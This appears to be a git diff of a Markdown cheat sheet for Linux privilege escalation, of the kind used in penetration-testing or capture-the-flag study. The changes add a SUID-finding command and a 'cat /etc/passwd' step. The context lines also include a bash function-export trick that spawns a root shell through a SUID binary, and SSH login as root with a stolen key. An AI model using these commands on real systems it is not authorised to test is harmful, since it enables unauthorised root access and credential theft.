@@ -19,8 +19,8 @@ Can I execute code as root (you will need the user's password)?
 `sudo -l`
 
 What executables have SUID bit that can be executed as another user?  
+`find / -type f -user root -perm /u+s -ls 2>/dev/null`  
 `find / -user root -perm -4000 -print 2>/dev/null`  
-`mail`  
 `find / -perm -u=s -type f 2>/dev/null`  
 `find / -user root -perm -4000 -exec ls -ldb {} \;`  
 
@@ -34,6 +34,7 @@ Do any of the SUID binaries run commands that are vulnerable to file path manipu
 
 Do any of the SUID binaries run commands that are vulnerable to Bash Function Manipulation?
 `strings /usr/bin/binaryelf`  
+`mail`
 `function /usr/bin/mail() { /bin/sh; }`  
 `export -f /usr/bin/mail`  
 `/usr/bin/binaryelf`  
@@ -96,6 +97,9 @@ Can I access services that are running as root on the local network?
 ## What can we READ?
 What files and folders are in my home user's directory?  
 `ls -la ~`  
+
+Do any users have passwords stored in the passwd file?
+`cat /etc/passwd`  
 
 Are there passwords for other users or RSA keys for SSHing into the box?  
 `ssh -i id_rsa root@10.10.10.10`  
